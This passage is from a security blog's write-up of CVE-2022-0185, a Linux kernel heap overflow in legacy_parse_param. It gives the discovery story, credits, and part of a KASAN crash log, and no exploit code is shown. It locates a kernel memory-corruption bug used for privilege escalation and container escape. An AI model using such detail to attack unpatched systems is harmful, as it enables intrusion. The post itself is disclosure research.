<!DOCTYPE html>
<html class='v2' dir='ltr' lang='en'>
<head>
<link href='https://www.blogger.com/static/v1/widgets/3566091532-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
<meta content='width=1100' name='viewport'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='https://www.willsroot.io/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='https://www.willsroot.io/2022/01/cve-2022-0185.html' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.willsroot.io/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="Will&#39;s Root - RSS" href="https://www.willsroot.io/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.blogger.com/feeds/8814147965526194982/posts/default" />

<link rel="alternate" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.willsroot.io/feeds/8508102479187046073/comments/default" />
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<link href='https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=w640-h344' rel='image_src'/>
<meta content='https://www.willsroot.io/2022/01/cve-2022-0185.html' property='og:url'/>
<meta content='CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google&#39;s KCTF Containers' property='og:title'/>
<meta content='Vulnerability Research on Low-Level Systems' property='og:description'/>
<meta content='https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=w1200-h630-p-k-no-nu' property='og:image'/>
<title>Will's Root: CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers</title>
<style type='text/css'>@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu72xKOzY.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu5mxKOzY.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu7mxKOzY.woff2)format('woff2');unicode-range:U+1F00-1FFF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu4WxKOzY.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu7WxKOzY.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu7GxKOzY.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(//fonts.gstatic.com/s/roboto/v32/KFOmCnqEu92Fr1Mu4mxK.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}</style>
<style id='page-skin-1' type='text/css'><!--
/*-----------------------------------------------
Blogger Template Style
Name:     Picture Window
Designer: Blogger
URL:      www.blogger.com
----------------------------------------------- */
/* Content
----------------------------------------------- */
body {
font: normal normal 16px Roboto;
color: #000000;
background: #e5e5e5 url(//2.bp.blogspot.com/-ErizLnNeTcI/XXVJdtjs78I/AAAAAAAABkQ/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw/s0/blog_background.jpg) repeat scroll top left;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
.content-outer {
font-size: 90%;
}
a:link {
text-decoration:none;
color: #fc0404;
}
a:visited {
text-decoration:none;
color: #fc0e0e;
}
a:hover {
text-decoration:underline;
color: #ff3f3f;
}
.content-outer {
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
-moz-border-radius: 15px;
-webkit-border-radius: 15px;
-goog-ms-border-radius: 15px;
border-radius: 15px;
-moz-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
margin: 30px auto;
}
.content-inner {
padding: 15px;
}
/* Header
----------------------------------------------- */
.header-outer {
background: rgba(0, 0, 0, 0) url(https://resources.blogblog.com/blogblog/data/1kt/transparent/header_gradient_shade.png) repeat-x scroll top left;
_background-image: none;
color: #ff0000;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.Header img, .Header #header-inner {
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 30px;
padding-right: 30px;
}
.Header h1 {
font: normal bold 39px 'Courier New', Courier, FreeMono, monospace;
text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
}
.Header h1 a {
color: #ff0000;
}
.Header .description {
font-size: 130%;
}
/* Tabs
----------------------------------------------- */
.tabs-inner {
margin: .5em 0 0;
padding: 0;
}
.tabs-inner .section {
margin: 0;
}
.tabs-inner .widget ul {
padding: 0;
background: #fbfbfb url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.tabs-inner .widget li {
border: none;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .5em 1em;
margin-right: 0;
color: #992211;
font: normal normal 15px Roboto;
-moz-border-radius: 0 0 0 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-radius: 0 0 0 0;
border-radius: 0 0 0 0;
background: transparent none no-repeat scroll top left;
border-right: 1px solid #d5d5d5;
}
.tabs-inner .widget li:first-child a {
padding-left: 1.25em;
-moz-border-radius-topleft: 10px;
-moz-border-radius-bottomleft: 10px;
-webkit-border-top-left-radius: 10px;
-webkit-border-bottom-left-radius: 10px;
-goog-ms-border-top-left-radius: 10px;
-goog-ms-border-bottom-left-radius: 10px;
border-top-left-radius: 10px;
border-bottom-left-radius: 10px;
}
.tabs-inner .widget li.selected a,
.tabs-inner .widget li a:hover {
position: relative;
z-index: 1;
background: #ffffff url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
color: #000000;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 100% 'Courier New', Courier, FreeMono, monospace;
text-transform: uppercase;
color: #ff0000;
margin: .5em 0;
}
/* Main
----------------------------------------------- */
.main-outer {
background: transparent none repeat scroll top center;
-moz-border-radius: 0 0 0 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-radius: 0 0 0 0;
border-radius: 0 0 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
.main-inner {
padding: 15px 5px 20px;
}
.main-inner .column-center-inner {
padding: 0 0;
}
.main-inner .column-left-inner {
padding-left: 0;
}
.main-inner .column-right-inner {
padding-right: 0;
}
/* Posts
----------------------------------------------- */
h3.post-title {
margin: 0;
font: normal bold 24px 'Courier New', Courier, FreeMono, monospace;
}
.comments h4 {
margin: 1em 0 0;
font: normal bold 24px 'Courier New', Courier, FreeMono, monospace;
}
.date-header span {
color: #ff0000;
}
.post-outer {
background-color: #ffffff;
border: solid 1px #e5e5e5;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 10px;
-goog-ms-border-radius: 10px;
padding: 15px 20px;
margin: 0 -20px 20px;
}
.post-body {
line-height: 1.4;
font-size: 110%;
position: relative;
}
.post-header {
margin: 0 0 1.5em;
color: #a8a8a8;
line-height: 1.6;
}
.post-footer {
margin: .5em 0 0;
color: #a8a8a8;
line-height: 1.6;
}
#blog-pager {
font-size: 140%
}
#comments .comment-author {
padding-top: 1.5em;
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #ff3f3f;
border-bottom: 1px solid #ff3f3f;
}
.comments .continue {
border-top: 2px solid #ff3f3f;
}
/* Widgets
----------------------------------------------- */
.widget ul, .widget #ArchiveList ul.flat {
padding: 0;
list-style: none;
}
.widget ul li, .widget #ArchiveList ul.flat li {
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
}
.widget ul li:first-child, .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.widget .post-body ul {
list-style: disc;
}
.widget .post-body ul li {
border: none;
}
/* Footer
----------------------------------------------- */
.footer-outer {
color:#f5f5f5;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
-moz-border-radius: 10px 10px 10px 10px;
-webkit-border-top-left-radius: 10px;
-webkit-border-top-right-radius: 10px;
-webkit-border-bottom-left-radius: 10px;
-webkit-border-bottom-right-radius: 10px;
-goog-ms-border-radius: 10px 10px 10px 10px;
border-radius: 10px 10px 10px 10px;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
.footer-inner {
padding: 10px 5px 20px;
}
.footer-outer a {
color: #fc5858;
}
.footer-outer a:visited {
color: #fc5858;
}
.footer-outer a:hover {
color: #fc5858;
}
.footer-outer .widget h2 {
color: #c6c6c6;
}
/* Mobile
----------------------------------------------- */
html body.mobile {
height: auto;
}
html body.mobile {
min-height: 480px;
background-size: 100% auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
html .mobile .mobile-date-outer, html .mobile .blog-pager {
border-bottom: none;
background: transparent none repeat scroll top center;
margin-bottom: 10px;
}
.mobile .date-outer {
background: transparent none repeat scroll top center;
}
.mobile .header-outer, .mobile .main-outer,
.mobile .post-outer, .mobile .footer-outer {
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.mobile .content-outer,
.mobile .main-outer,
.mobile .post-outer {
background: inherit;
border: none;
}
.mobile .content-outer {
font-size: 100%;
}
.mobile-link-button {
background-color: #fc0404;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile-index-contents {
color: #000000;
}
.mobile .tabs-inner .PageList .widget-content {
background: #ffffff url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
color: #000000;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #d5d5d5;
}
.code { background:#f5f8fa; background-repeat:no-repeat; border: solid #5C7B90; border-width: 1px 1px 1px 20px; color: #000000; font: 13px 'Courier New', Courier, monospace; line-height: 16px; margin: 10px 0 10px 10px; max-height: 10000px; min-height: 16px; overflow: auto; padding: 28px 10px 10px; width: 90%; } .code:hover { background-repeat:no-repeat; }
--></style>
<style id='template-skin-1' type='text/css'><!--
body {
min-width: 1010px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 1010px;
max-width: 1010px;
_width: 1010px;
}
.main-inner .columns {
padding-left: 0px;
padding-right: 240px;
}
.main-inner .fauxcolumn-center-outer {
left: 0px;
right: 240px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0px") -
parseInt("240px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0px;
}
.main-inner .fauxcolumn-right-outer {
width: 240px;
}
.main-inner .column-left-outer {
width: 0px;
right: 100%;
margin-left: -0px;
}
.main-inner .column-right-outer {
width: 240px;
margin-right: -240px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<style>
    body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/s0\/blog_background.jpg);}
    
@media (max-width: 200px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w200\/blog_background.jpg);}}
@media (max-width: 400px) and (min-width: 201px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w400\/blog_background.jpg);}}
@media (max-width: 800px) and (min-width: 401px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w800\/blog_background.jpg);}}
@media (max-width: 1200px) and (min-width: 801px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w1200\/blog_background.jpg);}}
/* Last tag covers anything over one higher than the previous max-size cap. */
@media (min-width: 1201px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w1600\/blog_background.jpg);}}
  </style>
<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8814147965526194982&amp;zx=aeac14c1-d256-49bf-af21-a6190e92bb4c' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8814147965526194982&amp;zx=aeac14c1-d256-49bf-af21-a6190e92bb4c' rel='stylesheet'/></noscript>
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>

<script type="text/javascript" language="javascript">
  // Supply ads personalization default for EEA readers
  // See https://www.blogger.com/go/adspersonalization
  adsbygoogle = window.adsbygoogle || [];
  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
    adsbygoogle.requestNonPersonalizedAds = 1;
  }
</script>


</head>
<body class='loading variant-shade'>
<div class='navbar no-items section' id='navbar' name='Navbar'>
</div>
<div class='body-fauxcolumns'>
<div class='fauxcolumn-outer body-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content'>
<div class='content-fauxcolumns'>
<div class='fauxcolumn-outer content-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content-outer'>
<div class='content-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left content-fauxborder-left'>
<div class='fauxborder-right content-fauxborder-right'></div>
<div class='content-inner'>
<header>
<div class='header-outer'>
<div class='header-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left header-fauxborder-left'>
<div class='fauxborder-right header-fauxborder-right'></div>
<div class='region-inner header-inner'>
<div class='header section' id='header' name='Header'><div class='widget Header' data-version='1' id='Header1'>
<div id='header-inner' style='background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEge2MCWyMqG7cMJlr53KZygzYRYJHA90UmBywZPqMRpciNkZy_M8Hfx__-mTv6If5m0fnTZowsyvGZ141DapRN6FMDjnCQVnL4t02GYBmjGqUExnsz0tLJUFf2n6okR_w_dnvpqpfe-2FMB/s1057/COOL+AUDIO+WAVES-for-blog.jpg"); background-position: left; min-height: 294px; _height: 294px; background-repeat: no-repeat; '>
<div class='titlewrapper' style='background: transparent'>
<h1 class='title' style='background: transparent; border-width: 0px'>
<a href='https://www.willsroot.io/'>
Will's Root
</a>
</h1>
</div>
<div class='descriptionwrapper'>
<p class='description'><span>Vulnerability Research on Low-Level Systems</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class='header-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</header>
<div class='tabs-outer'>
<div class='tabs-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left tabs-fauxborder-left'>
<div class='fauxborder-right tabs-fauxborder-right'></div>
<div class='region-inner tabs-inner'>
<div class='tabs section' id='crosscol' name='Cross-Column'><div class='widget BlogSearch' data-version='1' id='BlogSearch1'>
<h2 class='title'>Search This Blog</h2>
<div class='widget-content'>
<div id='BlogSearch1_form'>
<form action='https://www.willsroot.io/search' class='gsc-search-box' target='_top'>
<table cellpadding='0' cellspacing='0' class='gsc-search-box'>
<tbody>
<tr>
<td class='gsc-input'>
<input autocomplete='off' class='gsc-input' name='q' size='10' title='search' type='text' value=''/>
</td>
<td class='gsc-search-button'>
<input class='gsc-search-button' title='search' type='submit' value='Search'/>
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
<div class='clear'></div>
</div></div>
<div class='tabs no-items section' id='crosscol-overflow' name='Cross-Column 2'></div>
</div>
</div>
<div class='tabs-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='main-outer'>
<div class='main-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left main-fauxborder-left'>
<div class='fauxborder-right main-fauxborder-right'></div>
<div class='region-inner main-inner'>
<div class='columns fauxcolumns'>
<div class='fauxcolumn-outer fauxcolumn-center-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-left-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-right-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class='columns-inner'>
<div class='column-center-outer'>
<div class='column-center-inner'>
<div class='main section' id='main' name='Main'><div class='widget Blog' data-version='1' id='Blog1'>
<div class='blog-posts hfeed'>

          <div class="date-outer">
        
<h2 class='date-header'><span>Tuesday, January 25, 2022</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=w640-h344' itemprop='image_url'/>
<meta content='8814147965526194982' itemprop='blogId'/>
<meta content='8508102479187046073' itemprop='postId'/>
<a name='8508102479187046073'></a>
<h3 class='post-title entry-title' itemprop='name'>
CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-8508102479187046073' itemprop='description articleBody'>
<p>Recently, several friends on my CTF team <a href="https://cor.team">Crusaders of Rust</a>
 and I found a Linux kernel heap overflow 0-day. We found the bug 
through fuzzing with syzkaller and we quickly developed it into an 
Ubuntu LPE exploit. Afterwards, we rewrote it to escape and root 
Google&#8217;s hardened Kubernetes CTF infrastructure. This bug affects all 
kernel versions since 5.1 (5.16 is in progress currently), and has been 
assigned CVE-2022-0185. We have already disclosed this to the Linux 
security and distro mailing list, and the bug has been patched as of 
this article&#8217;s release. Before I continue, I would like to give several 
acknowledgements for those who worked with me.</p><p>A huge shoutout must go to <a href="https://clubby789.me">clubby789</a>, <a href="https://day91.me">Day91</a>, and <a href="https://twitter.com/ryaagard">ryaagard</a>.
 Thanks must go to all of them (especially ryaagard for porting the exploit to Ubuntu 20.04), for working with me on the exploit for 
several days straight. As an extra fun tidbit of information, Day is 
only 15 at the time of writing this exploit&#8230; I can&#8217;t wait to see what he
 will do in a few years!</p><p>Further thanks must go to <a href="https://xz.az">chop0</a> for finding this bug and setting up our private fuzzing infrastructure, and <a href="https://github.com/ginkoid">ginkoid</a> for giving us ideas for container escapes and setting up our testing infrastructure. </p><p>One last thing to mention is that this bounty submission was actually a bug collision. During the disclosure process, we found out that&nbsp;<a href="https://twitter.com/n0psledbyte">n0psledbyte</a>&nbsp;from the Singaporean VR firm StarLabs actually found the same bug earlier. Since we were the first to properly report and disclose it, Google was still nice enough to grant us a sizeable bounty - thanks to&nbsp;<a href="https://twitter.com/sirdarckcat?lang=en">sirdarckcat</a>&nbsp;for helping us out with the bug collision situation.</p><p>Beginning 2022, our teamates were resolved to find a 0 day in 2022. 
We weren&#8217;t really sure how exactly to get started, but since our team 
had a high degree of familiarity with Linux kernel exploits, we decided 
to just purchase some dedicated servers and run Google&#8217;s <a href="https://github.com/google/syzkaller">syzkaller</a> fuzzer. On January 6th at 22:30 PST, chop0 hit the following report on a KASAN failure in <code>legacy_parse_param</code>:&nbsp;<code>slab-out-of-bounds Write in legacy_parse_param</code>.&nbsp;It seems like <a href="https://groups.google.com/g/syzkaller-android-bugs/c/hWixpJ22kc8/m/-fEuuHsxEAAJ">syzbot</a>
 found this issue just 6 days earlier when fuzzing Android, but the 
issue was left unhandled and we naively thought no one else took notice.</p><p>



</p><p>The following was the crash log:</p><p><span style="background-color: whitesmoke; display: block; font-family: monospace; max-width: 100%; overflow-x: auto; white-space: pre;">BUG: KASAN: slab-out-of-bounds in legacy_parse_param+0x450/0x640 fs/fs_context.c:569
Write of size 1 at addr ffff88802d7d9000 by task syz-executor.12/386100

CPU: 3 PID: 386100 Comm: syz-executor.12 Not tainted 5.14.0 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
Call Trace:
 __dump_stack lib/dump_stack.c:88 [inline]
 dump_stack_lvl+0x4d/0x66 lib/dump_stack.c:105
 print_address_description.constprop.0+0x21/0x140 mm/kasan/report.c:233
 __kasan_report mm/kasan/report.c:419 [inline]
 kasan_report.cold+0x7f/0x11b mm/kasan/report.c:436
 legacy_parse_param+0x450/0x640 fs/fs_context.c:569
 vfs_parse_fs_param+0x1fd/0x390 fs/fs_context.c:146
 vfs_fsconfig_locked+0x177/0x340 fs/fsopen.c:265
 __do_sys_fsconfig fs/fsopen.c:439 [inline]
 __se_sys_fsconfig fs/fsopen.c:314 [inline]
 __x64_sys_fsconfig+0x6a6/0x7a0 fs/fsopen.c:314
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3b/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x44/0xae
RIP: 0033:0x7fe8eeb7489d
Code: 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fe8edcc5c28 EFLAGS: 00000246 ORIG_RAX: 00000000000001af
RAX: ffffffffffffffda RBX: 00007fe8eec94030 RCX: 00007fe8eeb7489d
RDX: 0000000020000040 RSI: 0000000000000001 RDI: 0000000000000003
RBP: 00007fe8eebe100d R08: 0000000000000000 R09: 0000000000000000
R10: 0000000020000800 R11: 0000000000000246 R12: 0000000000000000
R13: 00007ffd8112faef R14: 00007fe8eec94030 R15: 00007fe8edcc5dc0

Allocated by task 386092:
 kasan_save_stack+0x1b/0x40 mm/kasan/common.c:38
 kasan_set_track mm/kasan/common.c:46 [inline]
 set_alloc_info mm/kasan/common.c:434 [inline]
 ____kasan_kmalloc mm/kasan/common.c:513 [inline]
 __kasan_kmalloc+0x7c/0x90 mm/kasan/common.c:522
 kmalloc include/linux/slab.h:591 [inline]
 legacy_parse_param+0x3e2/0x640 fs/fs_context.c:559
 vfs_parse_fs_param+0x1fd/0x390 fs/fs_context.c:146
 vfs_fsconfig_locked+0x177/0x340 fs/fsopen.c:265
 __do_sys_fsconfig fs/fsopen.c:439 [inline]
 __se_sys_fsconfig fs/fsopen.c:314 [inline]
 __x64_sys_fsconfig+0x6a6/0x7a0 fs/fsopen.c:314
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3b/0x90 arch/x86/entry/common.c:80
